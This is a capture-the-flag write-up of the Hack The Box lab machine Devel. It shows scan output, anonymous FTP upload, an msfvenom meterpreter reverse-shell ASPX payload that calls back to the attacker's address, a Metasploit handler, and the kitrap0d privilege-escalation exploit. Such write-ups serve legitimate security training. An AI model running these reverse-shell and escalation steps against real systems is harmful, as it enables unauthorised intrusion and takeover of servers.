---
"title": "Hack The Box - Devel"
"date": 2020-02-25
"tags": ["windows", "easy", "iis", "mfsvenom"]
"keywords": ["windows", "easy", "iis", "mfsvenom"]
"author": "Ghostbyt3"
"description": "We are going to pwn Devel from Hack The Box."
"featured_image": "/img/htb-devel/1.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "Writeup"
---


![Untitled](/img/htb-devel/1.png)

We are going to pwn Devel from Hack The Box.

Link : [https://www.hackthebox.eu/home/machines/profile/3](https://www.hackthebox.eu/home/machines/profile/3)


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       [DIR](DIR)          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## FTP:

We logged in as ``anonymous`` password can be anything. No files are interested.[br/](br/)
![Untitled](/img/htb-devel/2.png)

## HTTP:

This is just default IIS Page:
![Untitled](/img/htb-devel/3.png)

I started my gobuster and checked anything useful for us.

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.5
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/25 21:05:15 Starting gobuster
===============================================================
/aspnet_client (Status: 301)
===============================================================
2020/02/25 21:07:45 Finished
===============================================================
```

This looks like the same file as we saw in ``ftp`` this means the ftp is connected with web server.

I confirmed that with opening ``/welcome.png``
![Untitled](/img/htb-devel/4.png)

So now we need to upload a reverse shell in ``ftp`` and access it from web.
I look at the response of the web and the server is running as ``ASP.NET`` so we need to upload ``.aspx`` shell.
```
HTTP/1.1 304 Not Modified
Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
Accept-Ranges: bytes
ETag: "37b5ed12c9fd21:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Fri, 28 Feb 2020 23:49:04 GMT
Connection: close
```

We need to get reverse shell, I used ``msfvenom`` to create the payload.

> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=1234 -f aspx > reverse.aspx

![Untitled](/img/htb-devel/7.png)

Now upload it in ``ftp`` and using metasploit to get the shell.[br/](br/)
![Untitled](/img/htb-devel/8.png)

And start the metasploit and select ``exploit/multi/handler`` which provides a listener.
Set the payload that we used in ``msfvenom`` which is ``windows/meterpreter/reverse_tcp``.[br/](br/)
![Untitled](/img/htb-devel/9.png)


Now open the ``/reverse.aspx`` from the web [br/](br/)
![Untitled](/img/htb-devel/10.png)

I get the ``shell`` and checked ``systeminfo``[br/](br/)
![Untitled](/img/htb-devel/11.png)

Where ``Hotfix(s): N/A`` which means the system is not updated so far.

>A hotfix or quick-fix engineering update is a single, cumulative package that includes information that is used to address a problem in a software product.


I tried ``local_exploit_suggester`` this will give us some suggestions to exploit.For that we need to background the session.
```
meterpreter > 
Background session 3? [y/N]  
```
![Untitled](/img/htb-devel/12.png)

We need to enter the session which it need to check.
```
msf5 post(multi/recon/local_exploit_suggester) > sessions

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.28:1234 -> 10.10.10.5:49162 (10.10.10.5)

```
So its session 3.

Now we can run that[br/](br/)
![Untitled](/img/htb-devel/13.png)[br/](br/)
There is a lot of exploits suggested so I picked up random one.

> exploit/windows/local/ms10_015_kitrap0d


```
msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.28 
LHOST => 10.10.14.28
msf5 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1234
LPORT => 1234
msf5 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3
SESSION => 3
msf5 exploit(windows/local/ms10_015_kitrap0d) > run
```
![Untitled](/img/htb-devel/14.png)


